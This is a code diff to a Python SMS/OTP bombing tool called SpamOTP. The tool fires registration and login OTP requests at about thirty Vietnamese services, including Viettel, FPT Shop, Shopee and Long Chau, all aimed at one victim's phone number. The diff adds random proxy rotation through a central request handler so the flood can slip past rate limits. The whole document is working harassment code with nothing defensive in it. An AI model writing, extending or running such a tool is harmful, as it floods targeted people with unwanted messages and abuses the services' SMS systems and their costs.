@@ -24,8 +24,9 @@ if sys.platform.startswith('win'):
     sys.stdout.reconfigure(encoding='utf-8')
 
 class SpamOTP:
-    def __init__(self, phone):
+    def __init__(self, phone, proxies=None):
         self.phone = phone
+        self.proxies = proxies if proxies else []
         self.is_running = False
 
     def get_headers(self):
@@ -33,6 +34,42 @@ class SpamOTP:
             "user-agent": random.choice(USER_AGENTS)
         }
 
+    def get_proxy(self):
+        if not self.proxies:
+            return None
+        # Proxy format expected: ip:port or user:pass@ip:port
+        # Requests expects dict: {'http': 'http://ip:port', 'https': 'http://ip:port'}
+        proxy = random.choice(self.proxies).strip()
+        if not proxy: return None
+        
+        # Simple formatting if protocol not present
+        if not proxy.startswith("http"):
+            proxy_url = f"http://{proxy}"
+        else:
+            proxy_url = proxy
+            
+        return {
+            "http": proxy_url,
+            "https": proxy_url
+        }
+
+    def request(self, method, url, **kwargs):
+        """Centralized request handler with Proxy & Timeout support"""
+        # Inject Proxy
+        proxy = self.get_proxy()
+        if proxy:
+            kwargs['proxies'] = proxy
+        
+        # Inject Default Timeout if not set
+        if 'timeout' not in kwargs:
+            kwargs['timeout'] = REQUEST_TIMEOUT
+            
+        # Execute Request
+        if method.lower() == 'get':
+            return requests.get(url, **kwargs)
+        elif method.lower() == 'post':
+            return requests.post(url, **kwargs)
+        
     def log(self, message):
         # This method can be overridden by the caller (app.py)
         print(f"[*] {message}")
@@ -45,7 +82,7 @@ class SpamOTP:
                 "content-type": "application/json"
             })
             data = {"msisdn": self.phone}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"TV360: {response.status_code}")
         except Exception as e:
             self.log(f"TV360 Lỗi: {e}")
@@ -58,7 +95,7 @@ class SpamOTP:
                 "origin": "https://vietteltelecom.vn",
                 "referer": "https://vietteltelecom.vn/"
             }
-            response = requests.post(url, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, headers=headers)
             self.log(f"Viettel Login: {response.status_code}")
         except Exception as e:
             self.log(f"Viettel Login Lỗi: {e}")
@@ -82,7 +119,7 @@ class SpamOTP:
                 "Source": "https://www.sapo.vn/",
                 "LandingPage": "https://www.sapo.vn/"
             }
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"Sapo: {response.status_code}")
         except Exception as e:
             self.log(f"Sapo Lỗi: {e}")
@@ -95,7 +132,7 @@ class SpamOTP:
                 "referer": "https://video.mocha.com.vn/",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
-            response = requests.post(url, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, headers=headers)
             self.log(f"Mocha: {response.status_code}")
         except Exception as e:
             self.log(f"Mocha Lỗi: {e}")
@@ -118,7 +155,7 @@ class SpamOTP:
                 "platform": "web",
                 "ui": "012021"
             }
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"VieON: {response.status_code}")
         except Exception as e:
             self.log(f"VieON Lỗi: {e}")
@@ -131,7 +168,7 @@ class SpamOTP:
                 "referer": "https://fptshop.com.vn/",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
-            response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT) # Code says requestWithURL but no HTTPMethod set, defaults to GET usually for params in URL, but code uses requestWithURL which defaults to GET unless setHTTPMethod is called. Wait, fptshop method in ObjC DOES NOT set HTTPMethod, so it is GET.
+            response = self.request('get', url, headers=headers)
             self.log(f"FPT Shop: {response.status_code}")
         except Exception as e:
             self.log(f"FPT Shop Lỗi: {e}")
@@ -144,7 +181,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"phone": self.phone}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"FPT Shop Loyalty: {response.status_code}")
         except Exception as e:
             self.log(f"FPT Shop Loyalty Lỗi: {e}")
@@ -157,7 +194,7 @@ class SpamOTP:
                 "referer": "https://galaxyplay.vn/",
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
-            response = requests.post(url, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, headers=headers)
             self.log(f"GalaxyPlay 1: {response.status_code}")
         except Exception as e:
             self.log(f"GalaxyPlay 1 Lỗi: {e}")
@@ -178,7 +215,7 @@ class SpamOTP:
                  phone_param = "84" + phone_param[1:]
             
             data = {"phone": "+" + phone_param, "brandName": "30SHINE"}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"30Shine: {response.status_code}")
         except Exception as e:
             self.log(f"30Shine Lỗi: {e}")
@@ -197,7 +234,7 @@ class SpamOTP:
                 "CUSTOMER_NAME": "Nguyen Van A",
                 "LANGS": "vi_VN"
             }
-            response = requests.post(url, data=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, data=data, headers=headers)
             self.log(f"Cathay: {response.status_code}")
         except Exception as e:
             self.log(f"Cathay Lỗi: {e}")
@@ -212,7 +249,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"phone_number": self.phone, "email": "test@gmail.com", "type": 0, "is_register": True}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"Dominos: {response.status_code}")
         except Exception as e:
             self.log(f"Dominos Lỗi: {e}")
@@ -226,7 +263,7 @@ class SpamOTP:
             # Code doesn't set POST method for batdongsan in ObjC? 
             # ObjC: [request setAllHTTPHeaderFields:headers]; No [request setHTTPMethod:@"POST"];
             # Default is GET.
-            response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('get', url, headers=headers)
             self.log(f"Batdongsan: {response.status_code}")
         except Exception as e:
             self.log(f"Batdongsan Lỗi: {e}")
@@ -240,7 +277,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"phone": self.phone}
-            response = requests.post(url, data=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, data=data, headers=headers)
             self.log(f"Fahasa: {response.status_code}")
         except Exception as e:
             self.log(f"Fahasa Lỗi: {e}")
@@ -254,7 +291,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = f"action=verify-registration-info&phoneNumber={self.phone}&refCode=&refCode="
-            response = requests.post(url, data=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, data=data, headers=headers)
             self.log(f"Shopiness: {response.status_code}")
         except Exception as e:
             self.log(f"Shopiness Lỗi: {e}")
@@ -267,7 +304,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"account": self.phone, "function": "SSO_REGISTER", "type": "PHONE", "otpType": "NUMBER"}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"ViettelPost: {response.status_code}")
         except Exception as e:
             self.log(f"ViettelPost Lỗi: {e}")
@@ -279,7 +316,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             # ObjC defaults to GET here
-            response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('get', url, headers=headers)
             self.log(f"Bibabo: {response.status_code}")
         except Exception as e:
             self.log(f"Bibabo Lỗi: {e}")
@@ -293,7 +330,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = f"mobileNumber={self.phone}&maxTimesToResend=2&timeAlive=180&timeCountDownToResend=300"
-            response = requests.post(url, data=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, data=data, headers=headers)
             self.log(f"Owen: {response.status_code}")
         except Exception as e:
             self.log(f"Owen Lỗi: {e}")
@@ -306,7 +343,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = f"_method=POST&_token=SiaxKHlIoAzr75dYUMOR6tQrcpD0DIGYqntwqyos&type=zns&phone={self.phone}"
-            response = requests.post(url, data=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, data=data, headers=headers)
             self.log(f"PNJ: {response.status_code}")
         except Exception as e:
             self.log(f"PNJ Lỗi: {e}")
@@ -328,7 +365,7 @@ class SpamOTP:
                 "IsChoose": "1",
                 "FormType": 1
             }
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"F88: {response.status_code}")
         except Exception as e:
             self.log(f"F88 Lỗi: {e}")
@@ -341,7 +378,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"phone": self.phone, "deviceId": "33FC417B-681E-4C47-A0B8-DC98ED2F0BA8", "platform": "ios"}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"HeyU: {response.status_code}")
         except Exception as e:
             self.log(f"HeyU Lỗi: {e}")
@@ -354,7 +391,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"phone": {"region_code": "+84", "phone_number": self.phone}}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"The Coffee House: {response.status_code}")
         except Exception as e:
             self.log(f"The Coffee House Lỗi: {e}")
@@ -367,7 +404,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = f"phoneNumber={self.phone}&isReSend=false&sendOTPType=1"
-            response = requests.post(url, data=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, data=data, headers=headers)
             self.log(f"Dien May Xanh: {response.status_code}")
         except Exception as e:
             self.log(f"Dien May Xanh Lỗi: {e}")
@@ -380,7 +417,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"phone": self.phone}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"KingFoodMart: {response.status_code}")
         except Exception as e:
             self.log(f"KingFoodMart Lỗi: {e}")
@@ -393,7 +430,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"type": "register", "phone": self.phone}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"GHN: {response.status_code}")
         except Exception as e:
             self.log(f"GHN Lỗi: {e}")
@@ -406,7 +443,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"username": self.phone, "case": "register"}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"LotteMart: {response.status_code}")
         except Exception as e:
             self.log(f"LotteMart Lỗi: {e}")
@@ -419,7 +456,7 @@ class SpamOTP:
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"utm": [], "phone": self.phone}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"VayVND: {response.status_code}")
         except Exception as e:
             self.log(f"VayVND Lỗi: {e}")
@@ -432,7 +469,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"firebase_sms_auth": True, "mobile": self.phone, "country_code": "VN"}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"Vato: {response.status_code}")
         except Exception as e:
             self.log(f"Vato Lỗi: {e}")
@@ -445,7 +482,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"phoneNumber": self.phone, "fromSys": "WEBKHLC", "otpType": 0}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"Long Chau: {response.status_code}")
         except Exception as e:
             self.log(f"Long Chau Lỗi: {e}")
@@ -458,7 +495,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"type": "register", "phone": self.phone}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"Vinamilk: {response.status_code}")
         except Exception as e:
             self.log(f"Vinamilk Lỗi: {e}")
@@ -471,7 +508,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"phone": self.phone}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"GalaxyPlay 2: {response.status_code}")
         except Exception as e:
             self.log(f"GalaxyPlay 2 Lỗi: {e}")
@@ -484,7 +521,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"phone": self.phone}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"Shopee: {response.status_code}")
         except Exception as e:
             self.log(f"Shopee Lỗi: {e}")
@@ -497,7 +534,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"countryCode": "84", "type": "REGISTER", "phone": self.phone}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"Watsons: {response.status_code}")
         except Exception as e:
             self.log(f"Watsons Lỗi: {e}")
@@ -510,7 +547,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"email": "test@example.com", "name": "Test User", "phone_number": self.phone}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"TokyoLife: {response.status_code}")
         except Exception as e:
             self.log(f"TokyoLife Lỗi: {e}")
@@ -524,7 +561,7 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"countryCode": "84", "mobile": self.phone}
-            response = requests.post(url, json=data, headers=headers, timeout=REQUEST_TIMEOUT)
+            response = self.request('post', url, json=data, headers=headers)
             self.log(f"Go2Joy: {response.status_code}")
         except Exception as e:
             self.log(f"Go2Joy Lỗi: {e}")
